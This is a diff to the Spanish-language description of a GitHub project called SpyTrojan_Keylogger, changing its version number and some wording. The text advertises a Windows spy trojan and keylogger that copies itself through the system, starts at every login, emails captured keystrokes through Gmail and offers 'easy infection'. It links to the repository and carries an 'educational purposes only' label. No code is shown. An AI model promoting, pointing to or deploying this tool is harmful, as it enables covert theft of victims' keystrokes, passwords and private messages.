@@ -1,10 +1,10 @@
->[Solo Fines Educativos]<
+>[Solo Fines Educativos]< ||Solo Programadores de python||
 |>Troyano espía, Keylogger para Windows, se replica en el sistema y se inicia automaticamente al iniciar sesión. Envía los registro mediante Gmail <|
 https://github.com/SebastianEPH/SpyTrojan_Keylogger.git
 
->SpyTrojan_Keylogger v3.3.0 - Python3.8 
+>SpyTrojan_Keylogger v3.3.4 - Python3.8 
 
-Caracteristicas:
+CARACTERISTICAS:
 [+] Plataforma: Windows 7, 8.1, 10
 [+] Envío de registros de teclas por Gmail.
 [+] Recibe datos uno o varios correos a la vez.
@@ -18,6 +18,6 @@ Caracteristicas:
 [+] Multihilos, bajo uso de recursos.
 [+] Facil infección 
 [+] Documentación detallada y actualizada
-[-] No termux ni Linux
-[-] No remoto
-NOTA: Lea la documentación.
+[-] ||No Terminal de linux ni termux||
+[-] ||No remoto||
+NOTA: Necesario sabe python básico y leer la documentación.
